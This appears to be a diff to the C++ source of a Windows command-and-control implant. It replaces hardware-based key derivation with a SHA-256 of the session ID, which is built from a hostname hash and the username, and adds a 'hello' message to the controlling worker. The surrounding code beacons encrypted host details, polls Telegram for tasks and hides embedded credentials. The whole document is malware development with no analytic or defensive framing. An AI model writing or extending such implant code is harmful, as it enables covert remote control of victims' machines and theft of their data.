@@ -17,6 +17,7 @@
 #include <fstream>
 #include <stdio.h>
 #include <random>
+#include <wincrypt.h>
 
 // ─── No pragma – linked via build.sh ──────────────────────────────────────
 
@@ -41,6 +42,24 @@ namespace config {
 
 static std::wstring g_SessionId;
 static std::vector<BYTE> g_SessionKey;
+
+// Derive 32-byte key as SHA-256(sessionId) — must match worker's deriveKey(sid)
+static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
+    std::string utf8 = WStringToUTF8(sessionId);
+    HCRYPTPROV hProv = 0;
+    HCRYPTHASH hHash = 0;
+    std::vector<BYTE> result(32, 0);
+    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        return result;
+    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+        CryptHashData(hHash, reinterpret_cast<const BYTE*>(utf8.data()), static_cast<DWORD>(utf8.size()), 0);
+        DWORD len = 32;
+        CryptGetHashParam(hHash, HP_HASHVAL, result.data(), &len, 0);
+        CryptDestroyHash(hHash);
+    }
+    CryptReleaseContext(hProv, 0);
+    return result;
+}
 
 // ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───
 
@@ -280,11 +299,6 @@ static std::string BuildBeaconJson(const Session& s) {
 BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     taskOut = L"sleep";
     std::string plainBody = BuildBeaconJson(session);
-
-    if (g_SessionKey.empty()) {
-        g_SessionKey = DeriveHardwareKey();
-        DebugLog(L"Session key derived from hardware.");
-    }
 
     std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
     if (enc.empty()) enc = plainBody;
@@ -765,9 +779,6 @@ static DWORD WINAPI HeartbeatThread(LPVOID) {
 VOID BeaconLoop() {
     DebugLog(L"BeaconLoop started");
 
-    g_SessionKey = DeriveHardwareKey();
-    DebugLog(L"Session key derived from hardware.");
-
     Session session;
     session.hostname      = GetHostname();
     session.username      = GetUsername();
@@ -779,6 +790,8 @@ VOID BeaconLoop() {
     session.sessionId     = GetHostnameHash() + L"|" + session.username;
 
     g_SessionId = session.sessionId;
+    g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
+    DebugLog(L"Session key derived from session ID.");
     DebugLog(L"Session: " + session.sessionId);
 
     // Start Telegram poller thread
@@ -789,6 +802,7 @@ VOID BeaconLoop() {
     if (hHb) CloseHandle(hHb);
 
     DWORD failures = 0;
+    bool sentHello = false;
 
     while (true) {
         try {
@@ -806,6 +820,12 @@ VOID BeaconLoop() {
                 DebugLog(L"Beacon failure #" + std::to_wstring(failures));
             } else {
                 if (failures > 0) failures = 0;
+            }
+
+            if (ok && !sentHello) {
+                sentHello = true;
+                SendResult(session.sessionId, L"hi");
+                DebugLog(L"Sent hello to worker.");
             }
 
             if (ok) {
